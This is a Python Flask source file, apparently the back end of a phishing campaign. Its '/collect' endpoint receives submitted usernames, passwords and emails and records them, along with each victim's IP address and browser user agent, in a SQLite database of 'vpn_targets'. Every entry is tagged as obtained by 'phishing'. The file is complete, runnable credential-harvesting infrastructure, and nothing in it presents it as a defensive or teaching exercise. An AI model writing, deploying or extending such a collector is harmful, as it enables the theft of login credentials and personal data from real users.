from flask import Flask, request, jsonify
import sqlite3
import json
from datetime import datetime

app = Flask(__name__)

def get_db():
    conn = sqlite3.connect('vpn_targets.db')
    return conn

@app.route('/collect', methods=['POST'])
def collect():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data'}), 400
    
    username = data.get('username', '')
    password = data.get('password', '')
    email = data.get('email', '')
    domain = data.get('domain', 'unknown')
    ip = request.headers.get('X-Real-IP', request.remote_addr)
    user_agent = request.headers.get('User-Agent', '')
    
    conn = get_db()
    cursor = conn.cursor()
    
    # Находим или создаём цель
    cursor.execute("SELECT id FROM targets WHERE domain=?", (domain,))
    target = cursor.fetchone()
    
    if not target:
        cursor.execute("INSERT INTO targets (domain, url, cms, checked_at) VALUES (?, ?, ?, ?)",
                      (domain, f"https://{domain}", 'phishing', datetime.now().isoformat()))
        target_id = cursor.lastrowid
    else:
        target_id = target[0]
    
    cursor.execute("""
        INSERT INTO credentials (target_id, username, password, email, method, found_at, session_data)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    """, (
        target_id,
        username,
        password,
        email,
        'phishing',
        datetime.now().isoformat(),
        json.dumps({'ip': ip, 'user_agent': user_agent})
    ))
    
    conn.commit()
    conn.close()
    
    return jsonify({'success': True})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)